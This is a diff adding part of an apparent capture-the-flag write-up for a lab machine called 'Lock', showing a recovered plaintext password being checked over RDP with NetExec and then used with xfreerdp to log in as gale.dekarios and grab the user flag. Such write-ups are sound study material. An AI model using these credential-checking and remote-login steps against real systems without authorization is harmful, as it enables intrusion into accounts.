@@ -1059,4 +1059,38 @@ Password: ty8wnW9qCKDosXo6
 
 Plaintext password: `ty8wnW9qCKDosXo6`
 
+This password is valid to move laterally to the `gale.dekarios` account, NetExec confirmed it:
 
+<br />
+
+```bash
+❯ nxc rdp 10.129.29.102 -u gale.dekarios -p ty8wnW9qCKDosXo6
+RDP         10.129.29.102   3389   LOCK             [*] Windows 10 or Windows Server 2016 Build 20348 (name:LOCK) (domain:Lock) (nla:False)
+RDP         10.129.29.102   3389   LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosXo6 (Pwn3d!)
+```
+
+<br />
+
+The RDP port is open and these type of sessions are really good because we can access both a graphical interface and the terminal.
+
+To connect we will use `xfreerdp` indicating a drive for our linux machine to have the possibility of share resources if we need it (modify the path to your own directory):
+
+<br />
+
+```bash
+xfreerdp /v:10.129.29.102 /u:gale.dekarios /p:'ty8wnW9qCKDosXo6' /cert:ignore /drive:Shared,/home/theredp4nther
+```
+
+<br />
+
+![9](../../../assets/images/Lock/9.png)
+
+<br />
+
+The `user.txt` flag was retrieved.
+
+<br />
+
+# Privilege Escalation: gale.dekarios -> NT AUTHORITY\SYSTEM
+
+<br />
